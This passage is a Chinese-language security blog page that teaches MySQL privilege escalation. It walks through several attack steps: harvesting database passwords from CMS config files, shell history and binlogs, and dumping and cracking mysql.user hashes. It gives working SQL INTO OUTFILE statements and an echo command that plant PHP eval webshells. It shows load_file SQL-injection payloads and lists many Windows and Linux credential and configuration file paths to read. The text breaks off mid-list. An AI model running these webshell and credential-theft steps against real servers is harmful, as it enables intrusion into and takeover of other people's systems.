@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="0x01关系型数据库管理系统MySQL提权基础一、Mysql提权必备条件1.服务器安装Mysql数据库 利用Mysql提权的前提就是服务器安装了mysql数据库，且mysql的服务没有降权，Mysql数据库默认安装是以系统权限继承的，并且需要获取Mysql root账号密码。 2.判断Mysql服务运行权限 对于Mysql数据库服务运行权限有很多方法，我这里主要介绍三种，一种是通过查看系统账号，也">
+<meta name="keywords" content="mysql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql提权篇">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql提权/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="0x01关系型数据库管理系统MySQL提权基础一、Mysql提权必备条件1.服务器安装Mysql数据库 利用Mysql提权的前提就是服务器安装了mysql数据库，且mysql的服务没有降权，Mysql数据库默认安装是以系统权限继承的，并且需要获取Mysql root账号密码。 2.判断Mysql服务运行权限 对于Mysql数据库服务运行权限有很多方法，我这里主要介绍三种，一种是通过查看系统账号，也">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywq37dv9zj20i304dweo.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywx7kn185j20hi07vdh4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywq4evnlpj20go09mwj6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywxf7bmxpj20ld0deaat.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywxfwzhywj20og0bzq3a.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywyamsqghj21240kgq6r.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywyf1acgqj20vx0c4n1t.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywylijbouj21010howmn.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywyqkegboj20hv04t74u.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywzgxony7j20mh087gme.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywz8xo9n6j211f0emgp4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywz1m62f8j20di0373yp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywy010pekj20dv07gq3m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyxvhe97u5j20ze0f3402.jpg">
+<meta property="og:image" content="http://s2.51cto.com/wyfs02/M02/8E/0A/wKioL1iz-LfiXi2dAABweJzi7qs564.jpg-wh_651x-s_656932454.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywr1fgo6xj20dw096jsv.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywr33kikuj20dw0793zk.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyx1v71qtwj20zs0ij0v0.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyww4tvbdvj20ax064jre.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyww6us1qwj20bd08j0t3.jpg">
+<meta property="og:image" content="http://s1.51cto.com/wyfs02/M02/8E/56/wKiom1i-DCPCf-qnAAAuT4IkzJ8440.jpg">
+<meta property="og:image" content="http://s1.51cto.com/wyfs02/M00/8E/54/wKioL1i-DDXzVIzjAAAp237OOX8004.jpg">
+<meta property="og:image" content="http://s4.51cto.com/wyfs02/M01/8E/56/wKiom1i-DD-joRkMAAAtbI3D9VY491.jpg">
+<meta property="og:image" content="http://s3.51cto.com/wyfs02/M02/8E/54/wKioL1i-DE2TsjzPAAAev8_z1zY368.jpg">
+<meta property="og:image" content="http://s4.51cto.com/wyfs02/M00/8E/56/wKiom1i-DGuRHHXzAABCTVxr46M615.jpg">
+<meta property="og:image" content="http://s2.51cto.com/wyfs02/M01/8E/54/wKioL1i-DH-hlvDEAABwzfevMTw562.jpg">
+<meta property="og:image" content="http://s1.51cto.com/wyfs02/M01/89/9A/wKiom1gX-qqjXew4AACKSax21YE067.jpg-wh_651x-s_69971220.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.413Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mysql提权篇">
+<meta name="twitter:description" content="0x01关系型数据库管理系统MySQL提权基础一、Mysql提权必备条件1.服务器安装Mysql数据库 利用Mysql提权的前提就是服务器安装了mysql数据库，且mysql的服务没有降权，Mysql数据库默认安装是以系统权限继承的，并且需要获取Mysql root账号密码。 2.判断Mysql服务运行权限 对于Mysql数据库服务运行权限有很多方法，我这里主要介绍三种，一种是通过查看系统账号，也">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywq37dv9zj20i304dweo.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql提权/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>mysql提权篇 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql提权/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">mysql提权篇
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-06 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-06T00:00:00+08:00">2019-01-06</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">22k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">20 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="0x01关系型数据库管理系统MySQL提权基础"><a href="#0x01关系型数据库管理系统MySQL提权基础" class="headerlink" title="0x01关系型数据库管理系统MySQL提权基础"></a>0x01关系型数据库管理系统MySQL提权基础</h1><h2 id="一、Mysql提权必备条件"><a href="#一、Mysql提权必备条件" class="headerlink" title="一、Mysql提权必备条件"></a>一、Mysql提权必备条件</h2><p><strong>1.服务器安装Mysql数据库</strong></p>
+<p>利用Mysql提权的前提就是服务器安装了mysql数据库，且mysql的服务没有降权，Mysql数据库默认安装是以系统权限继承的，并且需要获取Mysql root账号密码。</p>
+<p><strong>2.判断Mysql服务运行权限</strong></p>
+<p>对于Mysql数据库服务运行权限有很多方法，我这里主要介绍三种，<strong>一种是通过查看系统账号</strong>，也即使用“net user”命令查看系统当前账号，如果出现了mysql这类用户，以为着系统可能进行了降权，一般情况都不会降权。<strong>第二种方法就是看mysqld运行的Priority值</strong>，如下图所示。通过aspx的网页木马来查看Process信息，在图中我们可以看到系统权限的Priority值为“8 ”，如果Mysqld的Priority值也为8则意味着Mysql是以System权限运行的。<strong>第三种方法是查看端口可否外联</strong>，一般情况下是不允许root等账号外联，外部直接连接意味着账号可能被截取和嗅探，通过本地客户端直接连接对方服务器，直接查看和操作Mysql数据库，可以通过扫描3306端口来判断是否提供对外连接。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywq37dv9zj20i304dweo.jpg" alt></p>
+<p>查看Priority值来判断Mysqld服务运行权限</p>
+<h2 id="二、Mysql密码获取与破解"><a href="#二、Mysql密码获取与破解" class="headerlink" title="二、Mysql密码获取与破解"></a><strong>二、Mysql密码获取与破解</strong></h2><h3 id="1-获取网站数据库账号和密码"><a href="#1-获取网站数据库账号和密码" class="headerlink" title="1.获取网站数据库账号和密码"></a><strong>1.获取网站数据库账号和密码</strong></h3><p>对于CMS系统，一定会有一个文件定义了数据库连接的用户和密码。例如以下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. $db[&apos;default&apos;][&apos;hostname&apos;] = &apos;localhost&apos;;</span><br><span class="line">2. $db[&apos;default&apos;][&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">3. $db[&apos;default&apos;][&apos;password&apos;] = &apos;123456&apos;;</span><br><span class="line">4. $db[&apos;default&apos;][&apos;database&apos;] = &apos;crm&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywx7kn185j20hi07vdh4.jpg" alt></p>
+<p>dedecms数据库安装的信息就是写在<strong>data/common.inc.php</strong>，Discuz的数据库信息就在config/config_global_default.php、config /config_ucenter.php、config.inc.php。一般数据库配置文件都会位于config、application、conn、db等目录，配置文件名称一般会是conn.asp/php/aspx/jsp等。对于java会在/WEB-INF/config/config.properties中配置，总之通过查看源代码，进行层层分析，终究会发现数据库配置文件。</p>
+<p>对于Linux操作系统，除了上述方法获取root账号密码外，还可以通过查看<strong>./root/.mysql_history、./root/.bash_history</strong>文件查看mysql操作涉及的密码。当然对于Mysql5.6以下版本，由于设计Mysql程序时对于安全性的重视度非常低，用户密码是明文传输。MySQL对于binary log中和用户密码相关的操作是不加密的。如果你向MySQL发送了例如create user,grant user ... identified by这样的携带初始明文密码的指令，那么会在binary log中原原本本的被还原出来，执行“<strong>mysqlbinlog binlog.000001</strong>”命令即可获取，如下图所示。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywq4evnlpj20go09mwj6.jpg" alt></p>
+<p>查看binlog日志</p>
+<h3 id="2-获取Mysql数据库user表"><a href="#2-获取Mysql数据库user表" class="headerlink" title="2.获取Mysql数据库user表"></a><strong>2.获取Mysql数据库user表</strong></h3><p>MYSQL所有设置默认都保存在“C:\Program Files\MYSQL\MYSQL Server 5.0\data\MYSQL”中，也就是安装程序的data目录下，有关用户一共有三个文件即user.frm、user.MYD和 user.MYI，MYSQL数据库用户密码都保存在user.MYD文件中，包括root用户和其他用户的密码。在有权限的情况下，我们可以将User.frm、user.myd和User.myi三个文件下载到本地，通过本地的mysql环境直接读取user表中的数据。当然也可使用文本编辑器将user.MYD打开将root账号的密码复制出来到到cmd5.com进行查询和破解。对于Mysql数据库密码如果通过cmd5.com等网站不能查询到密码则需要自己手动破解，有关Mysql数据库密码手动破解，请查阅下一章。</p>
+<h3 id="3-Mysql密码查询"><a href="#3-Mysql密码查询" class="headerlink" title="3.Mysql密码查询"></a><strong>3.Mysql密码查询</strong></h3><p>可以通过以下查询语句直接查询mysql数据库中的所有用户和密码。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> mysql.user;</span><br><span class="line">2. <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span> =<span class="string">'root'</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywxf7bmxpj20ld0deaat.jpg" alt></p>
+<h3 id="4-MySQL密码加密算法"><a href="#4-MySQL密码加密算法" class="headerlink" title="4.MySQL密码加密算法"></a><strong>4.MySQL密码加密算法</strong></h3><p>MySQL实际上是使用了两次SHA1夹杂一次unhex的方式对用户密码进行了加密。具体的算法可以用公式表示：password_str = concat(&#39;*&#39;, sha1(unhex(sha1(password))))，可以通过查询语句进行验证，查询结果如下图所示。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">password</span>(<span class="string">'mypassword'</span>),<span class="keyword">concat</span>(<span class="string">'*'</span>,<span class="keyword">sha1</span>(<span class="keyword">unhex</span>(<span class="keyword">sha1</span>(<span class="string">'mypassword'</span>))));</span><br></pre></td></tr></table></figure>
+
+<p>mysql数据库加密算法</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywxfwzhywj20og0bzq3a.jpg" alt></p>
+<h2 id="三、Mysql获取webshell"><a href="#三、Mysql获取webshell" class="headerlink" title="三、Mysql获取webshell"></a><strong>三、Mysql获取webshell</strong></h2><p>Mysql root账号网站获取webshell具备的条件：</p>
+<p>1.知道站点物理路径，网站物理途径可以通过phpinfo函数、登录后台查看系统属性、文件出错信息、查看网站源代码以及路径猜测等方法获取。</p>
+<p>2.有足够大的权限，最好是root账号权限或者具备root权限的其它账号，可以用select user,password from mysql.user进行测试。</p>
+<p>3.magic_quotes_gpc()=OFF。对于<strong>PHP magic_quotes_gpc=on</strong>的情况，可以不对输入和输出数据库的字符串数据作addslashes()和stripslashes()的操作，数据也会正常显示。 对于PHP magic_quotes_gpc=off 的情况必须使用addslashes()对输入数据进行处理，但并不需要使用stripslashes()格式化输出，因为addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行。</p>
+<p><strong>4.直接导出webshell，执行下面语句</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">Select</span> <span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'物理路径'</span>;</span><br><span class="line">2. and 1=2 union all <span class="keyword">select</span> 一句话<span class="keyword">HEX</span>值 <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'路径'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>也可以通过创建表来直接完成，其中d:/www/exehack.php为webshell的名称和路径：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`mysql`</span>.<span class="string">`darkmoon`</span> (<span class="string">`darkmoon1`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> );</span><br><span class="line">2. <span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`mysql`</span>.<span class="string">`darkmoon`</span> (<span class="string">`darkmoon1`</span> ) <span class="keyword">VALUES</span> (<span class="string">'&lt;?php @eval($_POST[pass]);?&gt;'</span>);</span><br><span class="line">3. <span class="keyword">SELECT</span> <span class="string">`darkmoon1`</span> <span class="keyword">FROM</span> <span class="string">`darkmoon`</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'d://Wh0ale.php'</span>;</span><br><span class="line">4. <span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`darkmoon`</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywyamsqghj21240kgq6r.jpg" alt></p>
+<blockquote>
+<p>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</p>
+<p>方法一：</p>
+<p>这个原因其实很简单，是因为在安装MySQL的时候限制了导入与导出的目录权限,只能在规定的目录下才能导入</p>
+<p>们需要通过下面命令查看 secure-file-priv 当前的值是什么</p>
+<p>show variables like &#39;%secure%&#39;;那么我们把导入的路径改为上面的值就可以了</p>
+<p>方法二：</p>
+<p>找到my.ini的配置文件，在my.ini文件中搜索secure-file-priv找到并将它的值改为secure-file-priv=‘’</p>
+<p>重启MySQL就可以在任何目录下操作了</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywyf1acgqj20vx0c4n1t.jpg" alt></p>
+<p>菜刀连接</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fywylijbouj21010howmn.jpg" alt></p>
+<p><strong>5.有些情况下掌握了MSSQL数据库口令，但服务器环境是Windows2008，web环境是PHP，则可以通过SQLTOOLs工具，直接连接命令，通过以下命令写入shell：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @eval(request[xxx])? ^^&gt;^ &gt;c:\web\www\shell.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、Mysql渗透有用的一些技巧总结"><a href="#四、Mysql渗透有用的一些技巧总结" class="headerlink" title="四、Mysql渗透有用的一些技巧总结"></a><strong>四、Mysql渗透有用的一些技巧总结</strong></h2><h3 id="1-常见的有助于渗透到mysql函数"><a href="#1-常见的有助于渗透到mysql函数" class="headerlink" title="1.常见的有助于渗透到mysql函数"></a><strong>1.常见的有助于渗透到mysql函数</strong></h3><p>在对MySQL数据库架构的渗透中，MySQL内置的函数DATABASE()、USER()、SYSTEM_USER()、SESSION_USER()和CURRENT_USER()可以用来获取一些系统的信息，而load_file()作用是读入文件，并将文件内容作为一个字符串返回，这在渗透中尤其有用，例如发现一个php的SQL注入点，则可以通过构造“-1 union select 1,1,1,1,load_file(&#39;c:/boot.ini&#39;)”来获取boot.ini文件的内容。</p>
+<p><strong>(1)一些常见的系统配置文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. c:/boot.ini //查看系统版本</span><br><span class="line">2. c:/windows/php.ini //php配置信息</span><br><span class="line">3. c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line">4. c:/winnt/php.ini</span><br><span class="line">5. c:/winnt/my.ini</span><br><span class="line">6. c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</span><br><span class="line">7. c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</span><br><span class="line">8. c:\Program Files\Serv-U\ServUDaemon.ini</span><br><span class="line">9. c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br><span class="line">10. c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</span><br><span class="line">11. c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</span><br><span class="line">12. c:\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line">13. C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line">14. //存储了pcAnywhere的登陆密码</span><br><span class="line">15. c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</span><br><span class="line">16. c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</span><br><span class="line">17. c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</span><br><span class="line">18. d:\APACHE\Apache2\conf\httpd.conf</span><br><span class="line">19. C:\Program Files\mysql\my.ini</span><br><span class="line">20. C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br></pre></td></tr></table></figure>
+
+<p>LUNIX/UNIX 下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1. /usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</span><br><span class="line">2. /usr/local/apache2/conf/httpd.conf</span><br><span class="line">3. /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line">4. /usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line">5. /etc/sysconfig/iptables //从中得到防火墙规则策略</span><br><span class="line">6. /etc/httpd/conf/httpd.conf // apache配置文件</span><br><span class="line">7. /etc/rsyncd.conf //同步程序配置文件</span><br><span class="line">8. /etc/my.cnf //mysql的配置文件</span><br><span class="line">9. /etc/redhat-release //系统版本</span><br><span class="line">10. /etc/issue</span><br><span class="line">11. /etc/issue.net</span><br><span class="line">12. /usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line">13. /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line">14. /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 